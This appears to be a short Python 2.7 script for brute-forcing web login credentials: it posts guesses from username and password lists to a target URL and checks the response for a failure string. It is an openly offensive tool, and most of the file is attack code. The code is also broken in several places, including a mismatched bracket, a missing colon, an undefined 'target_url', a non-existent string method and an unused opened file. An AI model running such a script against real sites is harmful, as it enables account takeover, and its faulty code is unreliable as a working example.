#! /usr/bin/python
"""A simple script to attempt to guess web app login credentials.
   Uses Python 2.7.16"""

import requests
import optparse



def get_arguments():
    """Get user supplied arguments from terminal."""
    parser = optparse.OptionParser()
    # arguments
    parser.add_option('-t', '--target', dest='target', help='Target URL.')
    parser.add_option('-u', '--user-name', dest='user_name', help='List of potential usernames.')
    parser.add_option('-p', '--password-list', dest='password_list', help='List of potential passwords.')

    (options, arguments) = parser.parse_args()

    return options



options = get_arguments()

target = options.target
user_name = options.user_name
password_list = options.password_list

data_dict = {'username': '', 'password': '', 'login': 'submit')}

with open('passwords.list', 'r') as wordlist_file:
    for user in user_name
        for line in password_list:
            word = line.string()
            data_dict['password'] = word
            response = requests.post(target_url, data=data_dict)

            if 'Login failed' not in response.content.decode():
                print('[+] Got the password ==> ' + word)
                exit()

    print('[+] Reached end of file.')
